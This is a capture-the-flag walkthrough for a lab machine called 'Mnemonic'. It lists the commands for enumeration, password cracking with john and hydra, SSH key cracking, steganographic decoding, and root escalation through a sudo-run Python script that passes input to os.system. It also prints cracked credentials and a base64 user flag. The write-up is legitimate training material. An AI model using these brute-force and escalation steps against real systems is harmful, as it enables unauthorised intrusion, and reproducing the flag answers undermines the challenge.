# Mnemonic - Medium

* Map ```mnemonic.thm``` to given IP and do ```nmap``` scan - ```nmap -T4 -p- -A -Pn -v mnemonic.thm```:

  * 21/tcp - ftp - vsftpd 3.0.3
  * 80/tcp - http - Apache httpd 2.4.29 ((Ubuntu))
  * 765/tcp - filtered - webster
  * 1337/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

* The ```nmap``` scan shows '/robots.txt' file on port 80 - this contains a disallowed entry for '/webmasters/*'

* The webpage itself just mentions the word 'Test' - we will need to do some web enumeration:

  ```sh
  gobuster dir -u http://mnemonic.thm -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak -t 25

  gobuster dir -u http://mnemonic.thm/webmasters -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak -t 25

  gobuster dir -u http://mnemonic.thm/webmasters/admin -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak -t 25

  gobuster dir -u http://mnemonic.thm/webmasters/backups -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak -t 25
  # we do not find anything yet

  # include more file extensions
  gobuster dir -u http://mnemonic.thm/webmasters/backups -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # we get 'backups.zip'
  ```

* The '/webmasters' page is blank, so we are checking its sub-directories as well

* From the ```gobuster``` scan, we get directories '/webmasters/admin', '/webmasters/backups' - but we will need to scan these further

* From further scanning, we get the pages:

  * '/webmasters/admin/admin.html' - Admin Control Panel login page
  * '/webmasters/admin/login.html' - blank page

* The Admin Control Panel login page has username and password fields, and a 'Reset Password' option as well - which leads to the blank page at '/webmasters/admin/login.html'. Furthermore, the control panel login page itself has no functionality so we are at a dead end

* Going back to the directory scanning, we do not get anything under '/webmasters/backups/' initially, but as there is a secret file given, we can check again by including more file extensions

* This time, we get a file '/webmasters/backups/backups.zip', but this is password-protected, so we can use ```zip2john```:

  ```sh
  zip2john backups.zip > ziphash.txt

  john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
  # gives password '00385007'
  ```

* The zip file includes a note which mentions the new ftp username for 'James' is 'ftpuser'

* Since we do not know the password for 'ftpuser', we can try ```hydra``` to bruteforce:

  ```sh
  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt mnemonic.thm ftp
  # gives password 'love4ever'
  ```

* As we have the credentials now, we can log into ```ftp```:

  ```sh
  ftp mnemonic.thm

  ls

  ls -la

  # we have several directories
  # we can check further

  cd data-4
  # this directory includes some interesting files

  mget *
  # fetch all files from directory
  ```

* From ```ftp```, we get 2 files - one is ```id_rsa```, which can be used for SSH login; and the other one is a note for 'james' to change password

* We can try to use this ```id_rsa``` to log into SSH as 'james':

  ```sh
  chmod 600 id_rsa

  ssh james@mnemonic.thm -i id_rsa -p 1337
  # as SSH service is on port 1337 for this machine

  # we need passphrase for this user
  # ssh2john can be used here to crack the key

  ssh2john id_rsa > hash_id_rsa

  john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
  # this gives us 'bluelove'

  ssh james@mnemonic.thm -i id_rsa -p 1337
  # using above password, we can login
  ```

* As we have SSH login as 'james', we can start enumerating for lateral movement; ```ls -la /home``` shows we have several other users to check on this box:

  ```sh
  pwd
  # /home/james

  ls -la /home
  # several users

  # we get a broadcast message periodically

  ls -la
  # we have a few interesting files here

  cat 6450.txt
  # this includes random numbers, could be a wordlist
  ```

* Every once in a while, we also get a 'broadcast message' from root user indicating 'unauthorized access was detected' - this looks like some job is running in the background. In a while, we get more broadcast messages for system blocking and we are kicked off from SSH access, so we need to login again:

  ```sh
  # log into SSH again to continue enumeration
  
  cat noteforjames.txt
  # this includes a note saying user 'vill' created password for 'condor'
  # this also mentions image encryption technique and mnemonic

  cat /etc/crontab
  # shows 2 jobs are running

  # we cannot read the home directories for any other users except 'condor'
  ```

* ```cat /etc/crontab``` shows two cronjobs running as root - ```/usr/bin/sudo /usr/bin/python3 /bin/IPS.py```, and ```/usr/bin/sudo /sbin/dhclient enp0s3``` - we cannot read the Python script yet

* When we try to list files from home directory for 'condor', we get permission denied errors for normal files, and get a weird directory listing with question marks and filenames in encoded formats. The key filenames to be noted here are -

  * ```'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='```
  * ```''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''```

* We can use [CyberChef](https://gchq.github.io/CyberChef/) to decode this. The first string, when decoded from base64, leads us to a YouTube thumbnail for password cracking

* The second string, when decoded from base64, gives us the user flag

* Since we had a clue earlier about image encryption techniques and mnemonics, we can use steganography tools and check if this image includes anything interesting:

  ```sh
  # download the image

  steghide info maxresdefault.jpg
  # this asks for a passphrase
  # we can try the list of random numbers found earlier, but it does not work

  zsteg -a maxresdefault.jpg
  # error

  foremost maxresdefault.jpg
  # no files carved
  ```

* While searching for a steganography tool related to image encryption and mnemonics, we find [this tool](https://github.com/MustafaTanguner/Mnemonic) - we can give this a try:

  ```sh
  # install required modules
  # running tool as sudo otherwise it gives errors
  sudo pip3 install colored

  sudo pip3 install opencv-python

  # clone tool
  git clone https://github.com/MustafaTanguner/Mnemonic.git

  cd Mnemonic

  sudo python3 Mnemonic.py
  # enter the complete image file path
  
  # I was still getting a 'ValueError'
  # had to follow this - https://stackoverflow.com/questions/73693104/valueerror-exceeds-the-limit-4300-for-integer-string-conversion

  vim mnemonic.py
  # add this line
  # sys.set_int_max_str_digits(0)

  sudo python3 Mnemonic.py
  # this time, when we feed the image path, it works
  # we get a code that can be decrypted further

  # for decrypting, we need a file
  # we can use the '6450.txt' file here, which contained random numbers
  # using this we get a password at the end, this is for 'condor' user
  ```

* Now, as we have the credentials 'condor:pasificbell1981', we can SSH as 'condor':

  ```sh
  ssh condor@mnemonic.thm -p 1337

  sudo -l
  # this shows we can run the following as sudo
  # /usr/bin/python3 /bin/examplecode.py

  ls -la /bin/examplecode.py
  # owned by root, we cannot edit this file but can read it

  cat /bin/examplecode.py

  sudo /usr/bin/python3 /bin/examplecode.py
  # we can try running this
  # when we select the option for root shell, system gets rebooted
  # we need to respawn target again
  ```

* The Python script '/bin/examplecode.py' runs all commands as given - except when we input 5 or 7 - the former is supposed to give root shell but system is shutdown, and the latter clears the '/tmp' directory

* Now, from the Python script, if we select 0, we can either enter 'y' or 'yes' to exit the script, or enter '.'. When we enter '.', ```print(os.system(input("\nRunning....")))``` gets executed. So, whatever input is given at this step, it is executed as root:

  ```sh
  sudo /usr/bin/python3 /bin/examplecode.py
  # input 0
  # enter . when prompted
  # the program sleeps for a while before exiting

  sudo /usr/bin/python3 /bin/examplecode.py
  # input 0
  # enter .
  # when the program says 'running' and waits
  # enter 'sh'

  # this gives us a root shell
  cat /root/root.txt
  # this gives us a flag
  # we need to hash the inner string and submit it in flag format
  ```
